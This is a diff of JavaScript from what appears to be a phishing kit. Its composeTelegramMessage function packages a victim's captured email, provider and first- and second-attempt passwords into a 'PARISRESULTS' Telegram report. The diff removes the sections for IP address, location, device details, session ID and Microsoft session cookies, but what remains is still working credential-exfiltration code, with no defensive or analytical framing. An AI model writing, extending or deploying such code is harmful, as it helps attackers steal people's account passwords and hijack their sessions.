@@ -104,13 +104,6 @@ const composeTelegramMessage = (data) => {
         firstAttemptPassword,
         secondAttemptPassword,
         password, // Fallback
-        clientIP,
-        location,
-        deviceDetails,
-        timestamp,
-        sessionId,
-        microsoftCookies,
-        cookieList,
     } = data;
 
     const hasTwoStepData = firstAttemptPassword && secondAttemptPassword;
@@ -122,38 +115,14 @@ const composeTelegramMessage = (data) => {
         passwordSection = `🔑 Password: \`${password || 'Not captured'}\``;
     }
 
-    const formattedTimestamp = new Date(timestamp || Date.now()).toLocaleString('en-US', {
-        year: 'numeric', month: 'short', day: 'numeric',
-        hour: '2-digit', minute: '2-digit', second: '2-digit',
-        timeZone: 'UTC', hour12: true
-    }) + ' UTC';
-
-    // Build Microsoft cookie section if available
-    let microsoftSection = '';
-    if (provider && (provider.toLowerCase().includes('office365') || provider.toLowerCase().includes('outlook') || provider.toLowerCase().includes('microsoft'))) {
-        microsoftSection = buildMicrosoftCookieSection(microsoftCookies, cookieList);
-    }
-    const baseMessage = `
+    return `
 *🔐 PARISRESULTS 🔐*
 
 *ACCOUNT DETAILS*
 - 📧 Email: \`${email || 'Not captured'}\`
 - 🏢 Provider: *${provider || 'Others'}*
 - ${passwordSection}
-
-*DEVICE & LOCATION*
-- 📍 IP Address: \`${clientIP}\`
-- 🌍 Location: *${location.regionName}, ${location.country}*
-- 💻 OS: *${deviceDetails.os}*
-- 🌐 Browser: *${deviceDetails.browser}*
-- 🖥️ Device Type: *${deviceDetails.deviceType}*
-
-*SESSION INFO*
-- 🕒 Timestamp: *${formattedTimestamp}*
-- 🆔 Session ID: \`${sessionId}\`
 `;
-
-    return baseMessage + microsoftSection;
 };
 
 /**
